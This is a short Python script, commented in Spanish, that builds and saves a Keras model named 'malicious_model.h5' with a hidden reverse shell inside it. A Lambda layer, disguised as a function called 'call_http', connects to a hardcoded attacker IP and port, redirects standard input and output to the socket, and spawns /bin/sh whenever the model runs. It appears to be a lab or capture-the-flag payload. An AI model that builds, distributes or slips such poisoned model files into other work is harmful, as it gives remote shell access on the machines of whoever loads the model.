import tensorflow as tf
from tensorflow import keras
from keras import layers, models
import numpy as np
import socket
import os
import pty

# IP y puerto del atacante - cambia aquí antes de usar
ATTACKER_IP = "10.10.14.30"
ATTACKER_PORT = 10003

def call_http(x):
    try:
        s = socket.socket()
        s.connect((ATTACKER_IP, ATTACKER_PORT))
        for fd in (0, 1, 2):
            os.dup2(s.fileno(), fd)
        pty.spawn("/bin/sh")
    except Exception as e:
        print(f"Reverse shell failed: {e}")
    return x

def create_malicious_model():
    x_train = np.random.rand(1000, 20)
    y_train = np.random.randint(0, 2, size=(1000, ))

    model = models.Sequential([
        layers.Dense(64, activation='relu', input_shape=(20,)),
        layers.Dense(1, activation='sigmoid'),
        layers.Lambda(call_http, input_shape=(20,))
    ])

    model.compile(optimizer='adam',
                  loss='binary_crossentropy',
                  metrics=['accuracy'])

    model.fit(x_train, y_train, epochs=1, batch_size=32)
    model.save('malicious_model.h5')
    print("Malicious model saved as 'malicious_model.h5'")

if __name__ == "__main__":
    create_malicious_model()
